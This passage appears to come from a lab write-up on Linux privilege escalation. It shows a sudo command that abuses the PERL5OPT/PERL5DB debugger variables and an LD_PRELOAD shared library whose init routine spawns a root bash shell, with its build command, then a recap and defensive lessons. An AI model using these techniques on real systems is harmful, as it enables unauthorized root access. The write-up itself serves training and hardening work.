 Path one
 Perl debugger environment
-  PERL5OPT supplies default command-line options to Perl processes.
- PERL5DB can supply debugger initialization code when the Perl debugger is active.
```bash
PERL5OPT=-d
# Perl debugger option
PERL5DB='system("id")'
# Check the effective identity
```

The monitoring script invoked a Perl-based XML formatter, so inherited Perl environment settings affected the child process.
```bash
sudo PERL5OPT=-d PERL5DB='system("id")' /opt/monitor.sh
```
![Pasted image 20260827170944.png](../assets/labs-img/Pasted%20image%2020260827170944.png)

Path three
LD_PRELOAD can direct the Linux dynamic linker to load a shared library before other dependencies. Preserving it across privilege boundaries can expose privileged execution.
`shell.c`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
Build the shared library for the target architecture.
```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
# Position-independent code is suitable for loading at different memory addresses
# The shared-library option produces a library rather than a standalone program
# The no-start-files option omits the standard startup objects
```

#### Recap
RPC and NFS exposed a backup of the web application source. Source review showed that the application trusted a client-controlled privilege field and allowed administrators to control an export's file type. This led to initial code execution. A SUID helper then exposed access as Jack.

Jack could run the monitoring script through passwordless sudo. The script's environment and XML handling supported three distinct privilege escalation paths.

The Perl path exposed privileged debugger initialization through inherited environment variables.

The XML path allowed a privileged parser to read sensitive local files from an untrusted response.

The dynamic linker path allowed a privileged process to load an untrusted shared library.

All three paths succeeded in the lab.


Key Concepts:
1. RPC discovery can reveal NFS services and their exposed exports.
2. Ghidra can recover enough control flow to understand the behavior of a SUID binary.
3. Sanitize Perl debugger variables when crossing privilege boundaries.
4. Disable external entity resolution when parsing untrusted XML.
5. Strip dynamic linker variables from privileged environments and account for architecture when reviewing binaries.
